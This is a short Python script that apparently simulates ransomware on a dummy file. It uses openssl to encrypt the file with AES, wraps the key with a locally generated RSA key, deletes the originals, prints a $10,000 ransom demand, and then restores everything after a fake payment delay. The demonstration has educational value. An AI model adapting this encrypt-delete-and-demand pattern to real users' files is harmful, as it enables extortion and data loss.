import subprocess
import os
import time # this is purely aesthetic and to help indicate when the "payment" clears
# sys not needed

def run_cmd(command):
    # helper to execute shell commands using subprocess.
    subprocess.run(command, shell=True, check=True)

def main():
    # ensure we have a dummy file to encrypt if it doesn't exist
    if not os.path.exists("my_secrets.txt"):
        with open("my_secrets.txt", "w") as file:
            file.write("This is a secret message.")

    # 16-byte symmetric key (Base64)
    run_cmd("openssl rand -base64 16 > key.txt")

    # generate RSA public/private key pair
    run_cmd("openssl genrsa -out private.pem 2048")
    run_cmd("openssl rsa -in private.pem -pubout -out public.pem")

    # encrypt my_secrets.txt using the symmetric key (AES-256-CBC)
    # openssl enc uses a password. content of key.txt as the pass.
    run_cmd("openssl enc -aes-256-cbc -salt -in my_secrets.txt -out data_cipher.txt -pass file:key.txt -base64")

    # encrypt key.txt using the attacker public key
    run_cmd("openssl rsautl -encrypt -inkey public.pem -pubin -in key.txt -out key_cipher.txt")
    # Base64 encode the encrypted key file 
    run_cmd("base64 key_cipher.txt > temp.txt && mv temp.txt key_cipher.txt")

    # delete unencrypted original files
    os.remove("key.txt")
    os.remove("my_secrets.txt")

    # ransom msg
    print("Your file important.txt is encrypted. To decrypt it, you need to pay me $10,000 and send key_cipher.txt to me.")


    # now I will add a delay before decrypting the file
    print("\nWaiting for payment processing...")
    time.sleep(5) 
    print("Payment received: Restoring files...")

    # decode the base64 encrypted key file back to raw binary
    run_cmd("base64 -d key_cipher.txt > temp_cipher.bin")
    
    # decrypt the key using the private key
    run_cmd("openssl rsautl -decrypt -inkey private.pem -in temp_cipher.bin -out recovered_key.txt")

    # decrypt the original file using the recovered symmetric key
    run_cmd("openssl enc -d -aes-256-cbc -in data_cipher.txt -out my_secrets.txt -pass file:recovered_key.txt -base64")

    # clean up decryption artifacts
    os.remove("temp_cipher.bin")
    os.remove("recovered_key.txt")
    os.remove("data_cipher.txt")
    os.remove("key_cipher.txt")
    os.remove("private.pem")
    os.remove("public.pem")
    

    print("Decryption complete\n my_secrets.txt has been restored.")
main()
